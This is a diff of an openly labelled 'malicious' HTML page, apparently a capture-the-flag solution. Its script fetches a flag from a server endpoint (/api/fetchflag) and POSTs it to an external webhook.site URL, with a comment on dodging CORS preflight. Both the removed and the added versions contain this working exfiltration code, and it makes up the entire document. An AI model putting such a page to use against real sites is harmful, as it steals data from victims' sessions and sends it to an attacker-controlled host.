@@ -6,33 +6,19 @@
 <body>
     <h1>Welcome to My Malicious Page</h1>
     <script>
-        // Function to send the payload directly without triggering OPTIONS
-        function sendPayload(flag) {
-            fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json" // Simple header to avoid CORS preflight
-                },
-                body: JSON.stringify({ flag: flag })
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Payload sent successfully.");
-                } else {
-                    console.error("Error sending payload.");
-                }
-            })
-            .catch(err => console.error("Request failed: ", err));
-        }
-
-        // Fetch flag from the challenge server
+        // Fetch the flag from the server (assuming the server provides an endpoint to fetch the flag)
         fetch("/api/fetchflag")
-            .then(response => response.text())
+            .then(res => res.text())
             .then(flag => {
-                // Once flag is received, send it to the Webhook
-                sendPayload(flag);
-            })
-            .catch(error => console.error("Error fetching flag:", error));
+                // Send the flag to your Webhook URL
+                fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ flag: flag })
+                });
+            });
     </script>
 </body>
 </html>
